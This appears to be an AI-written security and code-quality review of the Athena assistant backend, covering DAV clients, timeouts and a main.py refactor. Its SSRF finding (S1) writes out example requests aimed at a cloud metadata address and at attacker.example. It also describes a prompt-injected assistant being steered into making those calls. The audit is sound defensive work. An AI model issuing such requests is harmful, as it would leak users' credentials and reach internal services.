# Athena — codebase review (July 2026)

A post-M26.11 review across three lenses, requested to make the project easier
for future (less-capable) AI agents to contribute to safely:

1. **Organization & agent-ergonomics** — structure, layout, discoverability.
2. **Correctness & coding-standards** — latent bugs, error handling, consistency.
3. **Security audit** — verifying the guarantees in `SECURITY.md` / `INVARIANTS.md`.

This is analysis only — **no code was changed**. Findings that warrant fixes are
grouped into proposed mini-milestones at the end, to be run under the usual
plan → approve → implement → test → docs loop.

Every High/Med finding below was re-verified against the actual source before
inclusion. Two findings surfaced independently in *both* the correctness and the
security streams (the missing DAV timeouts) — those are the strongest signal.

---

## Headline

The code is unusually disciplined for a project this size: broad excepts are
uniformly tagged and logged, subprocess adapters are hardened (`stdin=DEVNULL`,
arg-lists, timeouts), network/provider calls are offloaded and bounded, and
`yaml.safe_load`/`safe_dump` is used throughout. Ten of the twelve
security guarantees claimed in the docs were verified as genuinely solid.

The exceptions cluster in **two** places: the **CardDAV/CalDAV clients** (which
lag the hardening the rest of the DAV layer received) and the **structure of
`main.py`** (a 2,715-line monolith). Those two areas are where the leverage is.

---

## Part 1 — Security

### S1. [HIGH] SSRF + DAV credential exfiltration via caller-supplied URLs

`carddav_integration/client.py` (`_request`, `list_contacts`, `_fetch_vcard_str`,
`delete_contact`, `commit_merge`) and `caldav_integration/client.py`
(`DAVClient(url=...)`), reached from `main.py` `/carddav/*` and `/caldav/*`.

The `/caldav/events`, `/caldav/tasks`, `/carddav/contacts`, stage/import/delete
endpoints take a **full URL** (`calendar_url` / `address_book_url` / `href`) from
the request and pass it straight to an **authenticated** request — the user's DAV
Basic-Auth credentials are attached to *whatever host the URL names*. There is no
check that the host matches the configured `CALDAV_URL` / `CARDDAV_URL`.

Under the project's real threat model (a prompt-injected assistant calling tools
with malicious arguments, with an integration enabled), this lets the assistant
be steered into:

```
GET /caldav/events?calendar_url=http://169.254.169.254/latest/meta-data/
GET /carddav/contacts?address_book_url=http://attacker.example/x
```

The first hop carries `Authorization: Basic base64(user:pass)` to the
attacker/internal host — leaking the DAV credentials and reaching internal-only
services (cloud metadata, localhost admin, LAN). `delete_contact` / `commit_merge`
extend it to authenticated PUT/DELETE against an arbitrary URL.

Nextcloud is **not** affected — it concatenates a `path` onto a fixed
`self._base`, so the host can't be changed.

**Fix:** before issuing the request, reject any target whose scheme+host(+port)
doesn't equal the configured DAV base (an allowlist of the one configured
server). Apply to `calendar_url`, `address_book_url`, `contact_hrefs`/`href`, and
the URL rebuilt from `href` in `_fetch_vcard_str`/`delete_contact`.

### S2. [MED] CardDAV & CalDAV HTTP calls have no socket timeout

`carddav_integration/client.py:124,580,646` (`requests.request(...)` with no
`timeout=`); `caldav_integration/client.py:69` (`caldav.DAVClient(...)` with no
`timeout=`). *(Also independently found by the correctness review — C1/C2.)*

`requests` and the `caldav` client default to **wait-forever**. The routes wrap
them in `asyncio.wait_for(asyncio.to_thread(...), timeout=30)`, which returns a
timely 504 to the caller but — as `INVARIANTS.md` and `main.py` themselves note —
**cannot cancel the worker thread**. Against a server that accepts the connection
then never responds, each call pins a thread from the default `to_thread`
executor **forever**; ~32 such calls exhaust the pool and freeze *all* endpoints.

This directly contradicts the SECURITY.md claim: *"Provider and DAV calls run off
the event loop with bounded timeouts, so a slow/hung upstream can't … pin a
worker indefinitely."* True for providers and Nextcloud (`timeout=15`); **false
for CardDAV/CalDAV**.

**Fix:** pass an explicit `timeout=` to every `requests.request` in the CardDAV
client and to `caldav.DAVClient(...)`. Match Nextcloud's existing pattern.

### S3. [LOW] `backup_inspect` bypasses `_safe_export_path`

`main.py:2513-2520`. Every other export-path param (diff/download/delete) and the
restore body funnel through `_safe_export_path`; `inspect` builds the path from
the raw param and only `.exists()`-checks it. Exploitability is limited (the path
param is a single segment, can't contain `/`), so this is a defense-in-depth
consistency gap, not a confirmed traversal — but INVARIANTS claims the guard
gates *every* `data/exports` filename. **Fix:** route `inspect` through
`_safe_export_path` too. *(Correctness review flagged the same as a standards
nit.)*

### S4. [LOW] Server XML parsed with stdlib ElementTree (no defusedxml)

`nextcloud_integration/client.py:185,339`; `carddav_integration/client.py:170,238`.
`ET.fromstring()` on server-controlled XML is subject to entity-expansion
("billion laughs") DoS. Only reachable via a compromised/malicious DAV server
(the user's own), hence Low. **Fix:** `defusedxml.ElementTree`, or cap response
size before parsing.

### S5. [LOW] File *search* can list (not read) paths outside the allowlist via a symlink

`files/manager.py:254-262` (`rglob`/`glob`). A symlink already inside an
allowlisted root (e.g. `data/link -> /etc`) can surface external paths in search
results. **Reading them is still blocked** (`read_file`'s resolve+`relative_to`
rejects the external target), so this is filename disclosure only and needs a
pre-existing symlink. **Fix:** skip symlinked dirs during recursion, or
re-validate each result before returning.

### Verified solid (guarantees that hold)

File allowlist (read & write, symlink-safe) · memory category allowlist · backup
Zip-Slip (`_safe_target`) · diff_token (filename-bound, single-use, TTL) · export
path guard (restore/diff/download/delete) · CardDAV human-gating · credentials
(env-only, never in YAML/backups/logs *on disk* — wire-level leak is S1) ·
Nextcloud streaming size cap (enforced *during* iteration) · sanitized 500 ·
subprocess/command-injection resistance (arg-lists, no `shell=True`, no
`eval`/`exec`/`os.system`/`pickle`/unsafe-yaml) · provider API bounding.

## Part 2 — Correctness & coding standards

### C1/C2. [HIGH/MED] DAV clients lack transport timeouts

Same root cause as S2 above, viewed as a correctness bug: silent worker-thread
leak and eventual thread-pool exhaustion under a flaky/hung DAV server. This is
the finding most likely to actually bite in production. Fixed by the same change.

### C3. [MED] `FileManager.read_file` — no size cap; `UnicodeDecodeError` escapes as HTTP 500

`files/manager.py:295` (`resolved.read_text(encoding="utf-8")`), route
`main.py:1360-1377`. The route catches `PermissionError`/`FileNotFoundError`/
`IsADirectoryError` but not `UnicodeDecodeError`, so reading a binary or
non-UTF-8 allowlisted file returns an unhandled 500. There's also no size cap,
and `files_read` is an `async def` with no `to_thread`, so a large read buffers
fully **and** blocks the event loop. The Nextcloud counterpart already does the
right thing (2 MB cap, `errors="replace"`). **Fix:** cap the read and decode with
`errors="replace"` (or catch `UnicodeDecodeError` → 400).

### C4. [MED] Nextcloud `search_files` interpolates query/path into XML unescaped

`nextcloud_integration/client.py:306-314`. `query`/`dav_root` are f-string-
substituted into the DASL request body; a `&`, `<`, or `>` produces malformed
XML, the server returns non-207, and the code silently falls back to
`list_files` + local filter — so results are wrong/incomplete rather than
erroring. **Fix:** `xml.sax.saxutils.escape()` the interpolated values.

### C5. [MED] Heavy local file I/O runs on the event loop

Backup zip/list/inspect/diff (`main.py:2479-2541`) and `files_search`
(`main.py:1345` → `files/manager.py:254` `rglob`) do compression / whole-tree
walks synchronously on the loop; only `backup_restore` is wrapped in
`to_thread`. Real head-of-line-blocking risk and inconsistent with the file's own
concurrency convention. Lower urgency for a single-user local deploy. **Fix:**
wrap the zip/rglob-heavy handlers in `asyncio.to_thread`.

### C6. [LOW] Singleton stores mutated from worker threads without a lock

`dav_status/store.py`, `diagnostics/store.py`. Their comment says thread safety
"is not required (single-worker uvicorn)" — but that conflates *processes* with
*threads*: DAV clients run inside `to_thread` workers and call
`record_success`/`record_error` concurrently while status routes `deepcopy` via
`get_all()`. A deepcopy iterating a dict another thread is `.update()`-ing can
raise "dictionary changed size during iteration." The GIL prevents corruption,
not this race. **Fix:** a small `threading.Lock` around store reads/writes; fix
the comment.

### C7. [LOW] Memory YAML read-modify-write unguarded across the thread/loop boundary

`memory/manager.py`. `auto_extract` (worker thread) writes `pending_review.yaml`
while `memory_approve`/`memory_discard` (loop) rewrite the same file — a latent
last-writer-wins/corruption hazard. Low likelihood for one user. **Fix:** a lock
around the per-category read-modify-write.

### C8. [LOW] ICS reconstruction omits `DTSTAMP`; no 75-octet line folding

`dav_io/ics_io.py:405-432` (`_reconstruct_component`) emits VEVENT/VTODO without
the RFC-5545-required `DTSTAMP`; `escape_ics_text` (line 39) doesn't fold long
lines. Only hit on the reconstruct path (empty `raw_component`); strict servers
reject such events (fails gracefully but the event is lost). **Fix:** add
`DTSTAMP` on reconstruct; optionally fold >75-octet lines.

### Standards summary

Mostly consistent and strong. Small inconsistencies worth a cleanup pass:

- `nextcloud_integration/client.py:25` uses `logging.getLogger(__name__)` instead
  of the shared `from core.logger import logger` used by every other subsystem —
  its records skip Athena's handler/formatter. **Fix:** use the shared logger.
- All three DAV clients call `store._humanise_error(...)` — a *private* method —
  from outside the class. **Fix:** promote it to a public helper.
- No bare `except:`, no silent swallows, no `%`-formatting misuse, no TODO/FIXME
  debt, thorough type hints and docstrings — keep this bar.

## Part 3 — Organization & agent-ergonomics

### O1. [HIGH] `main.py` is a 2,715-line monolith (68 routes, 22 models, 9 globals)

A weak agent editing one endpoint must load a 107 KB file and risks touching
unrelated domains; line-number navigation is brittle. The file is *already*
cleanly sectioned by banner comments (core / memory / saved / voice / files /
caldav / carddav / conflicts / nextcloud / backup / dav_status) and the
`_require_*` accessor helpers already form a dependency-injection seam — so a
split into `APIRouter` modules is **mechanical, not risky**. **Fix (staged):**
create `app/routers/<domain>.py` per section, `app/models.py`, `app/state.py`
(convert `_require_*` to `Depends`), `app/lifespan.py`; keep `main.py` as thin
assembly. Do it router-by-router, starting with a self-contained one
(`dav_status`, `backup`, or `nextcloud`). This is the single highest-leverage
ergonomics change.

### O2. [HIGH] Stale 127-line milestone docstring at the top of `main.py`

`main.py:1-127` is a per-milestone changelog that **stops at M14** while the app
is at 2.6.10 — already wrong, and it's the first thing an agent reads in the
entry-point. It contradicts CLAUDE.md's "history lives in CHANGELOG.md." **Fix:**
replace with a ~10-line docstring (purpose, run command, pointers to
ARCHITECTURE.md / CLAUDE.md).

### O3. [HIGH] Two component maps that disagree

`CLAUDE.md:84-98` vs `docs/ARCHITECTURE.md:9-34`. The ARCHITECTURE tree omits
`diagnostics/`, `backup/`, `audit/`, `dav_io/`, `dav_status/`, `saved/`. An agent
orienting via ARCHITECTURE.md concludes those subsystems don't exist. **Fix:**
make one canonical (the CLAUDE.md map is more complete) and regenerate/point the
other at it.

### O4. [MED] No single `__version__` source

Three manually-synced anchors: `main.py:340`, `pyproject.toml:19`,
`tests/test_ops_hardening.py:362`. A weak agent doing a release will likely miss
one. **Fix:** `core/version.py` with `__version__`; `main.py` reads it,
`pyproject.toml` uses `dynamic = ["version"]` → `attr = core.version.__version__`,
the test imports it. Collapses 3 anchors to 1 and removes a whole "version
anchors" subsection from the docs.

### O5. [MED] Confusable DAV package family + inconsistent `__init__.py`

`dav_io` (local ICS/VCF parse), `dav_status` (in-memory ledger), and the three
`*_integration` (network) packages sit adjacent with names that don't encode the
distinction; 6 `__init__.py` are empty. A weak agent asked to "fix CalDAV export"
can't tell `caldav_integration/client.py` (network) from `dav_io/ics_io.py` (the
actual format logic). **Fix (docs-only, zero-risk):** add a 3-line header
docstring to each package's `__init__.py` stating what it owns and what it does
*not* — brings the 6 empty ones up to the `saved/__init__.py` standard. A rename
is higher-risk; defer it.

### O6. [MED] No route→test map; `audit/` mixes source with runtime logs

Routes are tested across ~13 files fanned out by *concern*, not module, so a weak
agent can't infer which test file to extend (e.g. version lives in
`test_ops_hardening`). **Fix:** a route-prefix → test-file table in
`docs/TESTING.md`. Separately, `audit/` holds tracked source *and* runtime
`.log` files; **fix:** point the log writer at `logs/audit/` so the source dir is
source-only.

### O7. [LOW] Scattered magic timeouts/caps; name collisions

`nextcloud_integration/client.py` hardcodes `timeout=15` four times and the 2 MB
cap inline; claude/gemini use a bare `120` where grok/chatgpt name the constant.
`saved/` (code) vs `profiles/*/saved/` (data), `config/` (yaml) vs
`core/config.py` (code) momentarily mislead. **Fix:** hoist repeated literals to
named module constants; add one clarifying line to the CLAUDE.md map.

### Positives worth preserving

`CLAUDE.md` + `AGENTS.md` + `INVARIANTS.md` (each rule paired with its enforcing
test) are strong agent scaffolding. No debt markers in source. `main.py`'s
section banners + `_require_*` seam make the monolith split mechanical.
`conftest.py` fixtures are well-documented. All packages correctly declared in
`pyproject.toml`.

## Proposed mini-milestones (for approval — not yet started)

Ordered by value-to-effort. Each is narrow and testable under the usual loop.

- **M26.12 — DAV transport hardening.** Add explicit timeouts to CardDAV
  `_request` and CalDAV `DAVClient` (S2 / C1 / C2). Closes a SECURITY.md
  contradiction; both review streams flagged it; ~2 files. Regression test:
  assert a hung server yields a bounded error, not an orphaned thread.
- **M26.13 — DAV SSRF guard.** Reject caller-supplied DAV URLs whose host ≠ the
  configured base (S1). Security-critical; add an INVARIANTS entry + test that an
  off-host `calendar_url`/`address_book_url` is rejected.
- **M26.14 — File-read robustness.** Size cap + `errors="replace"` /
  `UnicodeDecodeError` handling on `files.read_file`; offload backup + search
  file I/O to `to_thread` (C3 + C5).
- **M26.15 — Nextcloud correctness & logging.** XML-escape the DASL search
  query/path (C4); switch the client to the shared logger; optional defusedxml
  (S4).
- **M26.16 — Small consistency pass.** `backup_inspect` through
  `_safe_export_path` (S3); locks around the singleton stores + memory
  read-modify-write (C6/C7); promote `_humanise_error` to public.
- **M26.17 — Docs & version single-source (org, low-risk).** Trim the stale
  `main.py` docstring (O2); reconcile the two component maps (O3); single
  `__version__` (O4); `__init__.py` header docstrings for the DAV family (O5);
  route→test map (O6). No behaviour change.
- **M26.18 — `main.py` router split (org, larger).** Stage the monolith into an
  `app/` package of `APIRouter` modules (O1). Its own milestone given size; do it
  router-by-router with the suite green after each.

S1, S2, and C3 are the ones I'd prioritize; M26.17 is cheap and pays off every
future session. M26.18 is the big ergonomics win but the largest change.
